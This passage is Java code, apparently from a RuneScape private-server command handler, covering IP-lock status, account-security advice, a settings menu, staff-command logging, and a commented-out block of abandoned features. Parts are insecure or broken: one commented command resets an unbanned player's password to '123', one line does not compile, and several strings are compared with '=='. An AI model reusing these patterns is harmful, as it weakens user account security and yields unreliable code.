				
			}
			
			if(cmd[0].equalsIgnoreCase("iplockstatus")){
				player.getPackets().sendGameMessage("---------------------------------------------");               
				player.getPackets().sendGameMessage("IpLock: " + player.iplocked);               
				player.getPackets().sendGameMessage("locked With: " + player.lockedwith);               
				player.getPackets().sendGameMessage("Locking Disabled: " + player.disablelocking);               
				player.getPackets().sendGameMessage("Unlocking Boolean: " + player.unlocking);               
				player.getPackets().sendGameMessage("Hack Attempt: " + player.hackattempt);               				
				player.getPackets().sendGameMessage("---------------------------------------------");               
				
			}
			
			
			if(cmd[0].equalsIgnoreCase("securityinfo")){
				player.getPackets().sendIComponentText(35, 8, "How to keep your account secure.");
				player.getPackets().sendIComponentText(35, 1, "Dont use the same password.");
				player.getPackets().sendIComponentText(35, 4, "While this may seem obvious, its never wise to use the same passwords on every RSPS you play. The most common form of 'hacking' is from the use of an old password from a different server. Try change passwords each server.");
				player.getPackets().sendIComponentText(35, 2, "Dont share accounts.");
				player.getPackets().sendIComponentText(35, 5, "This one is also somewhat obvious. How ever if you share an account with someone or they know your password at any point they could get mad at you and that means the end of your account. While the Poanizer Project backs accounts up hourly its best for you to save yourself and the staff some trouble.");
				player.getPackets().sendIComponentText(35, 3, "The IPLock");
				player.getPackets().sendIComponentText(35, 6, "This is a new system I have developed which is somewhat like the J.A.G. the IP address you allow on your account is the only one that can login. If the IP's dont match your account will be instantly kicked with a warning message set for your next login. ::iplock will lock your current IP to your account. ::ipunlock will remove it.");
				player.getPackets().sendIComponentText(35, 7, "To Disable IPLock from being activated on your account type ::disablelocking");				
				player.getInterfaceManager().sendInterface(35);
			}
			
			
			
			if(cmd[0].equalsIgnoreCase("enables")){//31-40
				
				String levelmess = String.valueOf(player.levelmessage);
				String Plists = String.valueOf(player.PList);
				String loginmess = String.valueOf(player.loginmessages);
				String donarmess = String.valueOf(player.donorMess);
				String wgmess = String.valueOf(player.wgmess);
				String itemdropmess = String.valueOf(player.itemdropmess);
				
		String Colour1;	
		String Colour2;	
		String Colour3;	
		String Colour4;	
		String Colour5;		
		String Colour6;
			if(levelmess == "false"){
					Colour1 ="<col=ff0000>";
					}
					else{
					Colour1 ="<col=00FF00>"; 
					}
			if(Plists == "false"){
					Colour2 ="<col=ff0000>"; 
					}
					else{
					Colour2 ="<col=00FF00>"; 
					}
			if(loginmess == "false"){
					Colour3 ="<col=ff0000>"; 
					}
					else{
					Colour3 ="<col=00FF00>";
					}
			if(donarmess == "false"){
					Colour4 ="<col=ff0000>"; 
					}
					else{
					Colour4 ="<col=00FF00>"; 
					}
			if(wgmess == "false"){
					Colour5 ="<col=ff0000>"; 
					}
					else{
					Colour5 ="<col=00FF00>"; 
					}
			if(itemdropmess == "false"){
					Colour6 ="<col=ff0000>"; 
					}
					else{
					Colour6 ="<col=00FF00>"; 
					}
				player.getPackets().sendIComponentText(72, 55, "Enable/Disable Option settings.");
				
				player.getPackets().sendIComponentText(72, 31,Colour1 + "Level up Messages: " + levelmess.replace("true", "Enabled").replace("false", "Disabled"));
				player.getPackets().sendIComponentText(72, 32,Colour2 + "Player List on login: " + Plists.replace("true", "Enabled").replace("false", "Disabled"));
				player.getPackets().sendIComponentText(72, 33,Colour3 +  "Login News: " + loginmess.replace("true", "Enabled").replace("false", "Disabled"));
				player.getPackets().sendIComponentText(72, 34,Colour4 +  "Donator Information: " + donarmess.replace("true", "Enabled").replace("false", "Disabled"));
				player.getPackets().sendIComponentText(72, 35,Colour5 +  "WGuild Tokken Message: " + wgmess.replace("true", "Enabled").replace("false", "Disabled"));
				player.getPackets().sendIComponentText(72, 36,Colour6 +  "Loot Messages: " + itemdropmess.replace("true", "Enabled").replace("false", "Disabled"));;
				player.getPackets().sendIComponentText(72, 37, "Empty");
				player.getPackets().sendIComponentText(72, 38, "Empty");
				player.getPackets().sendIComponentText(72, 39, "Empty");
				player.getPackets().sendIComponentText(72, 40, "Empty");
				player.getInterfaceManager().sendInterface(72);
			}
			
			
			

			
			
			
		}
	 	return false;
	 } 
	
//Normal-Player End


//Logs every command people with "power" ranks do.
	public static void archiveLogs(Player player, String[] cmd) {
		try {
			if (player.getRights() < 4)
				return;
			String location = "";
			if (player.getRights() >= 5) {
				location = "data/logs/RankCommands/" + player.getUsername() + ".txt";
			}
			String afterCMD = "";
			for (int i = 1; i < cmd.length; i++)
		afterCMD += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			BufferedWriter writer = new BufferedWriter(new FileWriter(location,
					true));
			writer.write("[" + now("dd MMMMM yyyy 'at' hh:mm:ss z") + "] - ::"
					+ cmd[0] + " " + afterCMD);
			writer.newLine();
			writer.flush();
			writer.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	



	
	

	public static String now(String dateFormat) {
		Calendar cal = Calendar.getInstance();
		SimpleDateFormat sdf = new SimpleDateFormat(dateFormat);
		return sdf.format(cal.getTime());
	}
	

	
	

	private Commands() {

	}


}

//Ignore this crap, its all my failed ideas which I just keep incase i want to try re add later.
//Delete it if you want.

		//vote2mute
		/*
		if (cmd[0].equalsIgnoreCase("votemute")) {
				
				if(World.getPlayers().size() <= 3){
				
				player.getPackets().sendGameMessage("There Needs to be atleast 4 people online");
				
				}
				
				else if(Settings.voted2mute == ""){//isnt a vote2mute running
					Settings.voted2mute = cmd[1];//sets the vote2mute to a person
					World.sendWorldWideMessage("[Vote2Mute]: " + Settings.voted2mute + " is being voted to be muted by: " + player.getUsername());
					int Ponlines = World.getPlayers().size();
				//sets votes required to do it
					int RemovePlayers = (Ponlines / 3);
					Settings.enoughvotes2mute = (Ponlines -= RemovePlayers);
				}
				else{
					player.getPackets().sendGameMessage("There already is a mute vote going." + Settings.voted2mute + ".");
				}
				
		}
*/
		//vote2mute
		/*
		if (cmd[0].equalsIgnoreCase("muteyes")) {
					
			if(player.lastvote2mute <= Utils.currentTimeMillis()){
				
				Settings.enoughvotes2mute ++;
			}
			else{
			player.getPackets().sendGameMessage("You can only vote2mute  every 60 seconds.");
				
			}
		}
			if (cmd[0].equalsIgnoreCase("votev")) {
					
			player.getPackets().sendGameMessage(String.valueOf(Settings.lastmute));
			player.getPackets().sendGameMessage(String.valueOf(Settings.vote2mute));
			player.getPackets().sendGameMessage(String.valueOf(Settings.enoughvotes2mute));
			player.getPackets().sendGameMessage(String.valueOf(Settings.voted2mute));
			
			
				
		}if (cmd[0].equalsIgnoreCase("muteno")) {
			if(player.lastvote2mute <= Utils.currentTimeMillis()){
				
				Settings.enoughvotes2mute --;
			}
			else{
			player.getPackets().sendGameMessage("You can only vote2mute  every 60 seconds.");
				
			}
				
		}
		
	*/
//end of vote2 cmd

/*if (cmd[0].equalsIgnoreCase("refreshbyte")) {
			String byte = "";
				for (int i = 1; i < cmd.length; i++)
					byte += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player Server = SerializableFilesManager.loadPlayer(Utils.formatPlayerNameForProtocol(Hash));
				Server.setUsername(Utils.formatPlayerNameForProtocol(byte));
				
					player.decodefile(14);
					player.getPackets().sendGameMessage(Server.encodefile());
					
				
				
				return true;
				
				
				}*/
				
				
	/*String Controla = String.valueOf(player.getControlerManager().getControler());
			if (Controla.equalsIgnoreCase("com.rs.game.player.controlers")) {
				
				int remote = 0;
				if(cmd[1] == null){
						//do nothing.
					}if(Integer.valueOf(cmd[1]) == 1){
						remote = 1482;
					}if(Integer.valueOf(cmd[1]) == 2){
						remote = 1484;
					}if(Integer.valueOf(cmd[1]) == 3){
						remote = 1486;
					}if(Integer.valueOf(cmd[1]) == 4){
						remote = 1488;
					}if(Integer.valueOf(cmd[1]) == 5){
						remote = 1489;
					}

				if(!Rest.Seat1(player)){
				player.setNextFaceWorldTile(new WorldTile(player.getY() -1, player.getY(), 0));
				}		
				else{
				player.setNextFaceWorldTile(new WorldTile(player.getY() + 1, player.getY(), 0));
				}

					player.getAppearence().setRenderEmote(remote);
				}
			
				
 if (cmd[0].equalsIgnoreCase("claimdonation")) {
			
					if(player.checkdonation(player.getUsername()) != "EMPTY") {
					if(player.checkdonation(player.getUsername()) != "MYSQL"){
					if(player.checkdonation(player.getUsername()) != "CLAIMED"){
							String prizez = player.checkdonation(player.getUsername());
				if(prizez == "1"){
				player.getInventory().addItem(1, 1000);
                    player.getPackets().sendGameMessage("Prize 1.");
					            
				}else if(prizez == "2"){
				 player.getPackets().sendGameMessage("Prize 2.");
					
				}else if(prizez == "3"){
				 player.getPackets().sendGameMessage("Prize 3.");
					
				}
						
					}else{
						player.getPackets().sendGameMessage("You have already claimed your donation.");
					}	
					}else{
						player.getPackets().sendGameMessage("An Error has occured try again later.");
					}	
					} else {
						player.getPackets().sendGameMessage("Your Donation could not be found!.");
					}
				return true;
			}	
				
				
	
			//sets
			 if (cmd[0].equalsIgnoreCase("kit")) {		 
			 
			 switch(cmd[1])
			 {
					 case "bandos":
					 {
						if (player.canUseKits)
						{
							if (player.getInventory().getFreeSlots() >= 6)
							{
								player.getInventory().addItem(19438 , 1);
								player.getInventory().addItem(19428 , 1);
								player.getInventory().addItem(19431 , 1);
								player.getInventory().addItem(11696 , 1);
								player.getInventory().addItem(5 , 1);
								player.getInventory().addItem(6 , 1); 
								player.canUseKits = false;
							}
							else
							{
								player.getPackets().sendGameMessage("You do not have enough space in your inventory.");
							}
						}
						else
						{
							player.getPackets().sendGameMessage("Sorry, you already used a kit today!");
						}
					 }
					 break;
					 case "super":
					 {
					 	player.getPackets().sendGameMessage(String.valueOf(player.canUseKits));						
					 }
					 break;
					 case "wow":
					 {
						player.canUseKits = true;
					 }
					 break;
			 }
                   return true;			
				
				}
				
				
				
						

			
			if (cmd[0].equalsIgnoreCase("box")) {
                player.setNextFaceWorldTile(new WorldTile(1887,5405, 0));
				player.getControlerManager().startControler("BoxingC", 1);//dtcontroler, mode
				return true;
				}
		if (cmd[0].equalsIgnoreCase("box2")) {
                //player.setNextFaceWorldTile(new WorldTile(1887,5405, 0));
				Boxing.startEnduranceMode();
				return true;
				}

				
				
				if (cmd[0].equalsIgnoreCase("slaycoins")) {
				int points = player.getSlayerPoints() ;
				int coins = Integer.valueOf(cmd[1]);
				
				if(points < coins){
				player.getPackets().sendGameMessage("You dont have enough points.");
				}
				
				else{
				player.SlayerPoints -=  (coins);
				player.getInventory().addItem(13650 , (coins));
				player.getPackets().sendGameMessage("You receive " + coins + " Slayer coins. Remaining Slayer Points: " + player.SlayerPoints);
				}
				return false;
				}	
				
			if (cmd[0].equalsIgnoreCase("unpermban")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target != null) {
					target.setPermBanned(false);
					target.setBanned(0);
					target.setPassword("123");
					if (loggedIn)
						target.getSession().getChannel().close();
					else
						SerializableFilesManager.savePlayer(target);
					player.getPackets().sendGameMessage("You've permanently unbanned "+ (loggedIn ? target.getDisplayName() : name) + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/unpermban.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Un permbanned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
		if (cmd[0].equalsIgnoreCase("tryinter")) {
				WorldTasksManager.schedule(new WorldTask() {
					int i = 290;

					@Override
					public void run() {
						if (player.hasFinished()) {
							stop();
						}
						player.getInterfaceManager().sendInterface(i);
						System.out.println("Inter - " + i);
						i++;
					}
				}, 0, 1);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("tryanim")) {
				WorldTasksManager.schedule(new WorldTask() {
					int i = 14600;

					@Override
					public void run() {
						if (i > 15000) {
							stop();
						}
						if (player.getLastAnimationEnd() > System
								.currentTimeMillis()) {
							player.setNextAnimation(new Animation(-1));
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextAnimation(new Animation(i));
						System.out.println("Anim - " + i);
						i++;
					}
				}, 0, 3);
				return true;
			} 
				
			
		if (cmd[0].equalsIgnoreCase("trygfx")) {
				WorldTasksManager.schedule(new WorldTask() {
					int i = 2000;

					@Override
					public void run() {
						if (i >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(i));
						System.out.println("GFX - " + i);
						player.sm("GFX: "+i);
						i++;
					}
				}, 0, 3);
				return true;
			} 

					  
			

	if (cmd[0].equalsIgnoreCase("title")) {
				if (Integer.valueOf(cmd[1]) == 31){
				player.sm(" You dont want that title");
						return true;
				}
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage("Use: ::title id");
					return true;
				}
				try {
					player.getAppearence().setTitle(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Use: ::title id");
				}
				return true;
			}
			(Substring(cmd[1].equalsIgnoreCase) == (""))
			
			
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
			
			  				
						
			if (cmd[0].equalsIgnoreCase("otherbankrestyesimsure")) {
						
					
						
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				p2.bankreset = false;
				World.removePlayer(p2);		
							return true;
			
			}

			if (cmd[0].equalsIgnoreCase("resetbankyesimsure")) {
					player.bankreset = false;
					World.removePlayer(player);		
							return true;
			
			}
		
		
		*/